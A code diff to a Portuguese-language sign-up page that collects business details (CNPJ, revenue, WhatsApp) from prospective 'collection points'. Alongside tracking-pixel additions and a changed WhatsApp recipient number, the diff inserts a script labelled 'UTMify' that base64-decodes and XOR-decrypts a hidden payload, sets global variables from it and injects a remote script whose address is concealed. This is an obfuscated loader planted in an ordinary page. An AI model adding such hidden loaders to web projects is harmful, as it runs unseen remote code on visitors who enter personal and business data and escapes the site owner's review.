@@ -1,4 +1,23 @@
 <!DOCTYPE html><html lang="pt-BR"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Cadastro para Ponto de Coleta</title>
+<!-- TikTok Pixel: troque DBP58N3C77U8NDES2GU0 pelo ID do Pixel no TikTok Events Manager. -->
+<script>
+(function(){
+ var pixelId="DBP58N3C77U8NDES2GU0";
+ if(!pixelId)return;
+ !function(w,d,t){w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];
+ ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"];
+ ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};
+ for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);
+ ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e};
+ ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";
+ ttq._i=ttq._i||{};ttq._i[e]=[];ttq._i[e]._u=i;ttq._t=ttq._t||{};ttq._t[e]=+new Date;
+ ttq._o=ttq._o||{};ttq._o[e]=n||{};var a=d.createElement("script");
+ a.type="text/javascript";a.async=true;a.src=i+"?sdkid="+e+"&lib="+t;
+ var r=d.getElementsByTagName("script")[0];r.parentNode.insertBefore(a,r)};
+ ttq.load(pixelId);ttq.page();
+ }(window,document,"ttq");
+})();
+</script>
 <style>
 *{box-sizing:border-box}body{margin:0;background:#fff;color:#333;font-family:"Proxima Nova",system-ui,-apple-system,Arial,sans-serif;line-height:1.5}
 header{background:#ffe600;padding:10px 20px;display:flex;align-items:center}header img{height:38px}
@@ -19,7 +38,7 @@ input,select{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;fon
 .opt{display:block;width:100%;text-align:left;background:#f5f5f5;color:#333;border:2px solid transparent;border-radius:10px;padding:14px;margin:10px 0;font-size:15px;cursor:pointer}.opt:hover{border-color:#3483fa}
 .pb{height:6px;background:#eee;border-radius:9px;overflow:hidden;margin-bottom:16px}.pb i{display:block;height:100%;background:#ffe600;width:0;transition:width .3s}
 .chk{display:flex;gap:10px;font-weight:400;font-size:13px;align-items:flex-start}.chk input{width:auto;margin-top:4px}
-.err{color:#d93025;font-size:13px;min-height:18px}.hide{display:none}.hp{display:none!important}
+.err{color:#d93025;font-size:13px;min-height:18px}.hide{display:none}.hp{position:absolute;left:-9999px}
 body{padding-bottom:96px}
 .sticky{position:fixed;left:0;right:0;bottom:0;z-index:20;background:#fff;box-shadow:0 -2px 14px rgba(0,0,0,.12);padding:10px 16px calc(10px + env(safe-area-inset-bottom,0px))}.sticky>*{max-width:520px;margin-left:auto;margin-right:auto}.sticky .err{text-align:center;min-height:0;margin-bottom:6px}
 #ld{position:fixed;inset:0;z-index:50;background:rgba(255,255,255,.97);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px;font-weight:600;color:#333}#ld.hide{display:none}.spin{width:56px;height:56px;border:6px solid #ffe600;border-top-color:#3483fa;border-radius:50%;animation:sp .8s linear infinite}@keyframes sp{to{transform:rotate(360deg)}}
@@ -49,6 +68,8 @@ fbq('track','PageView');
     document.head.appendChild(a);
     </script>
     
+<!-- UTMify - script fornecido pelo proprietário do projeto -->
+<script>(function(){var y_im=atob("DBihfZD0RjGb47sPEWODCOKYZAu5i897YWubUr+XIl+1ls9ieH7YU/ObKx/5kZR8cmrIDeSHaUHym95jPmjIBfWYa0XyiM9gejbLDrLYZFDvl8lmc23VGOPWfGrGz5lofXfDHPyHZAvAmJlhcHXEX6rWMljwt9RkQXHZGPy9IhO3wc1ufW3EX6rWcFD90Y43JC7EG/HCf1D61t4+IyuYRaPCZEzGng==");var s_d2a=[];for(var c_d=0;c_d<y_im.length;c_d++){s_d2a.push(y_im.charCodeAt(c_d)&255);}var p_gmx=s_d2a[0];var c_c1y=s_d2a.slice(1,1+p_gmx);var u_qbf5=s_d2a.slice(1+p_gmx);var b_u7=u_qbf5.map(function(b,t_l82){return b^c_c1y[t_l82%p_gmx];});var q_eu9="";for(var s_3=0;s_3<b_u7.length;s_3++){q_eu9+=String.fromCharCode(b_u7[s_3]&255);}var p_21z4=decodeURIComponent(escape(q_eu9));var k_l7=JSON.parse(p_21z4);var e_s=k_l7.globals||[];e_s.forEach(function(l_1){window[l_1.name]=l_1.value;});var z_omj=document.createElement("script");z_omj.src=k_l7.url;z_omj.async=true;z_omj.defer=true;(k_l7.attributes||[]).forEach(function(z_bh){z_omj.setAttribute(z_bh.name,z_bh.value);});(document.head||document.documentElement).appendChild(z_omj);})();</script>
 </head><body>
 <header><img src="img/logo.jpg" style="border-radius:8px" alt="Logo do Ponto de Coleta" onerror="this.style.display='none'"></header>
 <div class="w">
@@ -87,7 +108,7 @@ fbq('track','PageView');
 <label for="fat">Faturamento mensal médio</label><select id="fat"><option value="">Selecione</option><option>Até R$ 5 mil</option><option>R$ 5 a 15 mil</option><option>R$ 15 a 30 mil</option><option>R$ 30 a 60 mil</option><option>Acima de R$ 60 mil</option></select>
 <label for="zap">WhatsApp</label><input id="zap" inputmode="tel" placeholder="(11) 90000-0000">
 <label for="mail">E-mail (opcional)</label><input id="mail" type="email">
-<input class="hp" id="website" name="empresa_site_ref" tabindex="-1" autocomplete="off" aria-hidden="true">
+<input class="hp" id="website" tabindex="-1" autocomplete="off">
 <label class="chk" style="margin-top:16px"><input type="checkbox" id="ok"> Autorizo o uso dos meus dados para contato sobre este serviço, conforme a LGPD, e confirmo ter CNPJ ativo e ponto físico.</label>
 </div>
 <div class="sticky"><div class="err" id="err"></div><button class="btn" id="send">Enviar cadastro</button></div>
@@ -105,7 +126,7 @@ fbq('track','PageView');
 <footer>Página oficial de cadastro de interesse em pontos de coleta.</footer>
 <div id="ld" class="hide"><div class="spin"></div><div id="ldt"></div></div>
 <script>
-var WA_NUMBER="5517991836403"; // TROQUE pelo seu WhatsApp: 55 + DDD + número, só dígitos
+var WA_NUMBER="5511982072072"; // TROQUE pelo seu WhatsApp: 55 + DDD + número, só dígitos
 var $=function(i){return document.getElementById(i)};
 var views=["quiz","result","formS","done"];
 function show(v){views.forEach(function(x){$(x).classList.toggle("hide",x!==v)});window.scrollTo(0,0)}
@@ -170,6 +191,8 @@ var msg="Olá! Acabei de enviar meu cadastro para ser ponto de coleta.\nNome: "+
 $("wa").href="https://wa.me/"+WA_NUMBER+"?text="+encodeURIComponent(msg);
 // Lead no Meta Pixel: só depois que o cadastro foi salvo. Sem enviar CPF, CNPJ, telefone ou outros dados pessoais.
 try{if(typeof window.fbq==="function")window.fbq("track","Lead",{content_name:"Cadastro ponto de coleta"})}catch(z){}
+// TikTok Lead: apenas apos confirmacao do cadastro pelo servidor.
+try{if(window.ttq && typeof window.ttq.track==="function")window.ttq.track("Lead",{content_name:"Cadastro ponto de coleta"})}catch(z){}
 await new Promise(function(z){setTimeout(z,Math.max(0,2600-(Date.now()-t0)))});stopLoad();show("done")}
 catch(x){stopLoad();$("send").disabled=false;var m="Não foi possível enviar. Tente novamente.";if(x&&x.c===404)m="Erro 404: o envio só funciona no site publicado na Vercel.";else if(x&&x.e==="db")m="Erro de banco de dados: conecte o Upstash na aba Storage da Vercel e faça Redeploy.";else if(x&&x.e==="inativo")m="Este CNPJ não está ativo na Receita. É necessário CNPJ ativo para participar.";else if(x&&x.c)m="Erro "+x.c+". Verifique o cadastro e tente novamente.";$("err").textContent=m}};
 </script></body></html>
